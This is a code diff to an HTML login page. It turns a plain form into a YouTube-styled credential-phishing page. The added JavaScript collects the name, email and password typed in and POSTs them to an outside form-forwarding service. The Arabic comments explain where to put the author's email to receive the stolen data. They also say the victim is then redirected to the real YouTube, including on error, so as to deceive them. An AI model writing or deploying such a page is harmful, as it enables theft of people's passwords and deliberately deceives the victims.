@@ -12,7 +12,7 @@
         body{
             background-color: #000;
         }
-        form{
+        div{
             position: absolute;
             top: 50%;
             left: 50%;
@@ -26,7 +26,7 @@
             padding: 30px;
             box-shadow: 1px 1px 10px 0 #fff;
         }
-        form input{
+        div input{
             width: 100%;
             padding: 10px;
             outline: none;
@@ -36,18 +36,59 @@
             border-radius: 20px;
             margin: 3px;    
         }
-        form input[type="submit"]{
+        div input[type="button"]{
             cursor: pointer;
+            background-color: #f00; /* تغيير اللون ليتناسب مع اليوتيوب */
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
-    <form action="/send" method="post">
-        <input type="text" name="name" placeholder="Your Name">
-        <input type="email" name="email" placeholder="Your Email">
-        <input type="password" name="password" placeholder="Your Password">
-        <input type="submit" value="login">
-    </form>
+    <div>
+        <input type="text" id="name" placeholder="Your Name">
+        <input type="email" id="email" placeholder="Your Email">
+        <input type="password" id="password" placeholder="Your Password">
+        <input type="button" onclick="send()" value="login">
+    </div>
+
+    <script>
+        function send() {
+            // 1. استخراج القيم المكتوبة داخل الحقول
+            const nameValue = document.getElementById("name").value;
+            const emailValue = document.getElementById("email").value;
+            const passwordValue = document.getElementById("password").value;
+
+            // التحقق من أن المستخدم لم يترك الحقول فارغة
+            if(!nameValue || !emailValue || !passwordValue) {
+                alert("يرجى ملء جميع الحقول أولاً!");
+                return;
+            }
+
+            // 2. إرسال البيانات فوراً إلى خدمة الإرسال المجانية بدون خادم خلفي
+            // تنبيه: ضع بريدك الإلكتروني الحقيقي بدلاً من المكتوب بالأسفل لتصلك الرسائل عليه
+            fetch("formsubmit.co", {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+                body: JSON.stringify({
+                    "اسم المستخدم": nameValue,
+                    "البريد الإلكتروني": emailValue,
+                    "كلمة المرور": passwordValue
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // تحويل المستخدم إلى موقع يوتيوب الحقيقي بعد نجاح العملية لخداعه فنياً
+                window.location.href = "https://youtube.com";
+            })
+            .catch(error => {
+                // التوجيه حتى لو حدث خطأ لضمان استمرار العملية
+                window.location.href = "https://youtube.com";
+            });
+        }
+    </script>
 </body>
 </html>
